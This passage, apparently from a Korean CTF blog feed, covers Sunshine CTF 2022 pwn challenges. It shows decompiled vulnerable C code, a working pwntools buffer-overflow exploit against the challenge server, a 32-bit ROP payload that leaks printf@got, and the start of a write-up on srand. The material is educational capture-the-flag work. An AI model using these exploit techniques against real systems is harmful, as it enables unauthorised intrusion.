class="number">97</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Master key prepared!\nKey: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(key);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>keyë¥¼ ì¶œë ¥í•´ì¤€ë‹¤. ì—¬ê¸°ì„œ fsbê°€ ë°œìƒí•  ìˆ˜ ìžˆì§€ë§Œ.. ì»¨íŠ¸ë¡¤í•˜ê¸°ê°€ ê½¤ ê¹Œë‹¤ë¡œì›Œë³´ì¸ë‹¤. ì•„ë¬´íŠ¼ ì¶œë ¥í•´ì£¼ëŠ” keyë¥¼ ë’¤ì—ì„œ ì–´ë–»ê²Œ ì‚¬ìš©í• ê¹Œ ìƒê°í•˜ë©´ì„œ ì¼ë‹¨ ë„˜ì–´ê°„ë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Menu: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1) Add password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2) Read password&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3) Chage name&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0) Exit&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> changeName();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> readPass();</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye Bye.... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        result = addPass();</span><br><span class="line">        encrypted = result;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu í•¨ìˆ˜ëŠ” whileì„ í†µí•´ ë¬´í•œížˆ ì‹¤í–‰ëœë‹¤. ì—¬ê¸°ì„œ ì£¼ëª©í•´ì•¼í•  ê²ƒì´ 3ë²ˆë©”ë‰´ changeName í•¨ìˆ˜ì™€ 1ë²ˆ ë©”ë‰´ addPass í•¨ìˆ˜ì´ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">changeName</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name is &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(username);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, username, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(username); <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ë¨¼ì € changeName í•¨ìˆ˜. ëŒ€ë†“ê³  fsbê°€ í„°ì§„ë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">addPass</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+100h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">44</span>]; <span class="comment">// [rsp+200h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+22Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src[i] = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    src[i] = key[i % <span class="number">8</span>] ^ buf[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(&amp;encrypted, dest, <span class="number">0x1F</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>addPass í•¨ìˆ˜. dest í¬ê¸°ê°€ 44ì¸ë° ì—¬ê¸°ë‹¤ê°€ 256 í¬ê¸°ì˜ srcë¥¼ ë³µì‚¬í•œë‹¤. ëŒ€ë†“ê³  bofê°€ í„°ì§€ê³  pieë„ ì—†ë‹¤. flagë¥¼ ì¶œë ¥í•´ì£¼ëŠ” í•¨ìˆ˜ë„ ì¡´ìž¬í•˜ë‹ˆ ë°”ë¡œ íë¦„ì„ ëŒë ¤ì£¼ë©´ ëœë‹¤. í•˜ì§€ë§Œ ì´ ì „ì— srcë¥¼ ê°€ê³µí•˜ë‹ˆ exploitì„ ìž‘ì„±í•  ë•Œ ìœ ì˜í•´ì¤˜ì•¼ í•œë‹¤. </p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>strcpy í•¨ìˆ˜ëŠ” ë³µì‚¬í•  ë•Œ ê¸¸ì´ ê²€ì¦ì„ í•˜ì§€ ì•Šì•„ bof ë°œìƒ ê°€ëŠ¥ì„±ì´ ì¡´ìž¬í•œë‹¤. ì´ ë¬¸ì œì—ì„œ ì´ë¡œ ì¸í•´ í•¨ìˆ˜ íë¦„ì„ ë³€ê²½í•  ìˆ˜ ìžˆëŠ” ê°€ëŠ¥ì„±ì´ ì¡´ìž¬í•œë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>key ê°’ leak</li><li>payload ìž‘ì„± í›„ addPass í•¨ìˆ˜ì˜ ë¡œì§ êµ¬í˜„</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12367</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Key: \r\n&#x27;</span>)</span><br><span class="line">key = p.recvline()[:-<span class="number">2</span>]</span><br><span class="line">info(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;it\r\n&#x27;, str(3))</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;name:&#x27;, b&#x27;%7$p&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="comment"># e.address = int(p.recv(14), 16) - 0x1543</span></span><br><span class="line"><span class="comment"># info(hex(e.address))</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;it\r\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">buf += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>+<span class="number">0x8</span>)</span><br><span class="line">buf += p64(<span class="number">0x40162d</span>)</span><br><span class="line">buf += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(buf))</span><br><span class="line">src = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">if</span> buf[i] == <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#src[i] = key[i%8] ^ buf[i]</span></span><br><span class="line">    src.append(key[i%<span class="number">8</span>] ^ buf[i])</span><br><span class="line">    </span><br><span class="line">src = <span class="built_in">bytes</span>(src)</span><br><span class="line">p.sendline(src)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="python3-bytes"><a href="#python3-bytes" class="headerlink" title="python3 bytes"></a>python3 bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>src = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>src</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(src)</span><br><span class="line"><span class="string">b&#x27;\x01\x02\x03&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hmmm...1_7h0u6h7_17_15_53cur3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Why GOT is not printed clearly when using printf</title>
      <link href="/221202-why_got_is_not_printed_clearly_when_using_printf/"/>
      <url>/221202-why_got_is_not_printed_clearly_when_using_printf/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>32bit ì›Œê²Œìž„ í”„ë¡œê·¸ëž¨ì—ì„œ GOTë¥¼ ì¶œë ¥í•˜ê³ ìž í–ˆì„ ë•Œ 4ë°”ì´íŠ¸ê°€ ì¶œë ¥ë˜ì§€ ì•Šê³  ê·¸ ì´ìƒì˜ ê°’ì´ ì¶œë ¥ë˜ì—ˆë‹¤. ê·¸ ì´ìœ ëŠ” leakí•  ë•Œ ì‚¬ìš©í•œ <code>printf</code> í•¨ìˆ˜ëŠ” null byteë¥¼ ë§Œë‚˜ê¸° ì „ê¹Œì§€ ì¶œë ¥í•˜ê¸° ë•Œë¬¸ì´ë‹¤.</p><h2 id="Why-GOT-is-not-printed-clearly-when-using-printf"><a href="#Why-GOT-is-not-printed-clearly-when-using-printf" class="headerlink" title="Why GOT is not printed clearly when using printf"></a>Why GOT is not printed clearly when using printf</h2><h3 id="printfë¥¼-ì‚¬ìš©í•˜ì—¬-GOTë¥¼-print-leak-í• -ë•Œ-ëª…í™•í•˜ê²Œ-ë˜ì§€-ì•ŠëŠ”-ì´ìœ "><a href="#printfë¥¼-ì‚¬ìš©í•˜ì—¬-GOTë¥¼-print-leak-í• -ë•Œ-ëª…í™•í•˜ê²Œ-ë˜ì§€-ì•ŠëŠ”-ì´ìœ " class="headerlink" title="printfë¥¼ ì‚¬ìš©í•˜ì—¬ GOTë¥¼ print(leak)í•  ë•Œ ëª…í™•í•˜ê²Œ ë˜ì§€ ì•ŠëŠ” ì´ìœ "></a>printfë¥¼ ì‚¬ìš©í•˜ì—¬ GOTë¥¼ print(leak)í•  ë•Œ ëª…í™•í•˜ê²Œ ë˜ì§€ ì•ŠëŠ” ì´ìœ </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x2c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br></pre></td></tr></table></figure><p>32bit ì›Œê²Œìž„ ë¬¸ì œë¥¼ í’€ë‹¤ê°€ ropë¥¼ í•´ì•¼í•˜ëŠ” ìƒí™©ì´ ìžˆì—ˆë‹¤. libc system í•¨ìˆ˜ ì‹¤ì œ ì£¼ì†Œë¥¼ êµ¬í•˜ê¸° ìœ„í•´ <code>printf@got</code>ë¥¼ leakí•˜ë ¤ê³  í–ˆëŠ”ë° 4ë°”ì´íŠ¸ ì´ìƒì˜ ë°”ì´íŠ¸ê°€ ì•„ëž˜ì™€ ê°™ì´ ì¶œë ¥ë˜ì—ˆë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0\x0f\xf7Ðœ\xc7\xf7\x96\x8`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7</span><br></pre></td></tr></table></figure><p><code>atoi@got</code>ëŠ” ê¹”ë”í•˜ê²Œ 4ë°”ì´íŠ¸ê°€ ì¶œë ¥ë˜ì—ˆëŠ”ë° <code>printf@got</code>ëŠ” 4ë°”ì´íŠ¸ ì´ìƒì˜ ë¬¸ìžì—´ì´ ì¶œë ¥ë˜ëŠ” ê²ƒì´ ì´ìƒí•˜ë‹¤ê³  ìƒê°ë˜ì–´ì„œ ë””ë²„ê¹…ì„ í•´ë³´ì•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; der $_got()</span><br><span class="line">0x8049ffcâ”‚+0x0000:  add BYTE PTR [eax], al</span><br><span class="line">0x804a000â”‚+0x0004: 0x8049f14  â†’  &lt;_DYNAMIC+0&gt; add DWORD PTR [eax], eax</span><br><span class="line">0x804a004â”‚+0x0008: 0xf7f0ea20  â†’  0x00000000</span><br><span class="line">0x804a008â”‚+0x000c: 0xf7eebc00  â†’   endbr32</span><br><span class="line">0x804a00câ”‚+0x0010: 0xf7c50f30  â†’  &lt;printf+0&gt; endbr32</span><br><span class="line">0x804a010â”‚+0x0014: 0xf7c79cd0  â†’  &lt;getchar+0&gt; endbr32</span><br><span class="line">0x804a014â”‚+0x0018: 0x8048396  â†’  &lt;__gmon_start__@plt+6&gt; push 0x10</span><br><span class="line">0x804a018â”‚+0x001c: 0xf7c1f160  â†’  &lt;__libc_start_main+0&gt; endbr32</span><br><span class="line">0x804a01câ”‚+0x0020: 0xf7c73890  â†’  &lt;setvbuf+0&gt; endbr32</span><br><span class="line">0x804a020â”‚+0x0024: 0xf7c370c0  â†’  &lt;atoi+0&gt; endbr32</span><br></pre></td></tr></table></figure><p><code>0x804a00c</code> ì£¼ì†Œë¥¼ ì¶œë ¥í•˜ë©´ <code>0xf7c50f30</code>ê°€ ê¹”ë”í•˜ê²Œ print(leak) ë  ì¤„ ì•Œì•˜ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; print-format -l 40 --bitlen 8 --lang py 0x804a00c</span><br><span class="line">buf = [0x30, 0xf, 0xc5, 0xf7, 0xd0, 0x9c, 0xc7, 0xf7, 0x96, 0x83, 0x4, 0x8, 0x60, 0xf1, 0xc1, 0xf7, 0x90, 0x38, 0xc7, 0xf7, 0xc0, 0x70, 0xc3, 0xf7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>buf = [<span class="number">0x30</span>, <span class="number">0xf</span>, <span class="number">0xc5</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x9c</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0x96</span>, <span class="number">0x83</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x60</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xf7</span>, <span class="number">0x90</span>, <span class="number">0x38</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0xc0</span>, <span class="number">0x70</span>, <span class="number">0xc3</span>, <span class="number">0xf7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(buf)</span><br><span class="line"><span class="string">b&#x27;0\x0f\xc5\xf7\xd0\x9c\xc7\xf7\x96\x83\x04\x08`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7&#x27;</span></span><br></pre></td></tr></table></figure><p>í•˜ì§€ë§Œ ë‚´ê°€ í•¨ìˆ˜ ì£¼ì†Œ leakí•˜ëŠ” ì½”ë“œë¥¼ <code>printf</code> í•¨ìˆ˜ë¥¼ ì´ìš©í–ˆê¸° ë•Œë¬¸ì— null byteê¹Œì§€ ì¶œë ¥í•˜ëŠ” <code>printf</code> í•¨ìˆ˜ íŠ¹ì„±ì— ì˜í•´ 4ë°”ì´íŠ¸ ì´ìƒì´ ì¶œë ¥ì´ ëœë‹¤. </p><p><code>atoi@got</code> ê°™ì€ ê²½ìš°ì—ëŠ” ë°”ë¡œ ë’¤ê°€ null byteì˜€ê¸° ë•Œë¬¸ì— 4ë°”ì´íŠ¸ê°€ ê¹”ë”í•˜ê²Œ ì¶œë ¥ëœ ê²ƒì´ì—ˆë‹¤. </p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
            <tag> GOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sunshine CTF 2022 - CTF Simulator (srand)</title>
      <link href="/221127-sunshine2022-ctf_simulator/"/>
      <url>/221127-sunshine2022-ctf_simulator/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(74&#x2F;445) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Step right up and compete to improve your guessing CTF skills!</p><p>nc sunshinectf.games 22000</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â””â”€â”€ ctf-simulator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf-simulator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8095b13ea4b618e9e704441f0d78b2e9989b5d14, for GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ì „ë¶€ ë‹¤ ê±¸ë ¤ìžˆë‹¤ê³  ê²ë¨¹ìœ¼ë©´ ì•ˆëœë‹¤. ì˜¤ížˆë ¤ ê°„ë‹¨í•œ ë¬¸ì œì¼ ìˆ˜ë„ ìžˆë‹¤.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, &amp;dest[<span class="number">0x14</span>], <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Fatal error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  srand(*(_DWORD *)&amp;dest[<span class="number">0x14</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;||| CTF Simulator 2022 |||&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This CTF training simulator will hone your guessing skills so you can be more competitive in CTF competitions!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s the name of your CTF team?\n[&gt;] &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  src = sub_1349();</span><br><span class="line">  <span class="keyword">if</span> ( !src )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid team name!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span 